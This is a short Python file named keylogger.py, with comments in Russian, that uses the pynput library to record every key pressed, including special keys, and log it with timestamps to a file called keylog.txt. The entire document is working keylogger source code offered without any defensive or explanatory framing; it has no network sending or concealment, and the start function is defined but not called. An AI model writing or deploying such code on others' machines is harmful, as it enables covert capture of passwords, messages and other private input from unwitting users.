# keylogger.py
from pynput import keyboard
import logging

# Укажите файл для логирования
logging.basicConfig(filename="keylog.txt", level=logging.DEBUG, format='%(asctime)s: %(message)s')

def on_press(key):
    try:
        logging.info(f'Key {key.char} pressed')
    except AttributeError:
        logging.info(f'Special key {key} pressed')

def start_keylogger():
    # Запуск слушателя
    with keyboard.Listener(on_press=on_press) as listener:
        listener.join()
